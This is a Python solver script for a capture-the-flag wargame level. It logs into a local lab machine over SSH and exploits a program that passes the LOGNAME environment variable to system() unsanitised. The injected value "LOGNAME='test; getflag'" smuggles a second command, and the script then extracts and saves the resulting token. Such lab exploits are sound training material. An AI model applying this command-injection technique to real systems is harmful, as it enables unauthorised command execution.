"""Level07 - LOGNAME Environment Variable Command Injection"""

import sys, re
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from common.utils import ssh_cmd, scp_cmd, read_flag, save_flag

def exploit(host, port, ssh_port, pwd):
	print(f"[*] Connecting to level07@{host}:{ssh_port}")
	code, out, err = ssh_cmd(host, ssh_port, "level07", pwd, "id")
	if code != 0:
		print("[!] SSH failed")
		return False, ""
	print(f"[+] SSH OK: {out.strip()}\n")
	print("[*] Exploiting LOGNAME injection...")
	cmd = "LOGNAME='test; getflag' ./level07"
	code, out, err = ssh_cmd(host, ssh_port, "level07", pwd, cmd)
	full_output = out + err
	if "token" in full_output.lower():
		print("[+] Executed!")
		match = re.search(r"token\s*:\s*([a-zA-Z0-9_-]+)", full_output)
		if match:
			print(f"[+] Token: {match.group(1)}")
			return True, match.group(1)
		return True, full_output.strip()
	print(f"[!] Failed. Code: {code}")
	return False, ""

def main():
	print("Level07 LOGNAME Command Injection\n")
	pwd = read_flag(6)
	success, token = exploit("localhost", 4747, 4242, pwd)
	if success:
		save_flag(7, token)
		print(f"\n[SUMMARY]\n  Vulnerability: Env var injection\n  Attack: Unsanitized LOGNAME in system()\n  Result: Command execution as flag07\n[ANSWER]\n  Level07 Token: {token}")
	else:
		print("[!] Exploit failed")
		sys.exit(1)

if __name__ == "__main__":
	main()
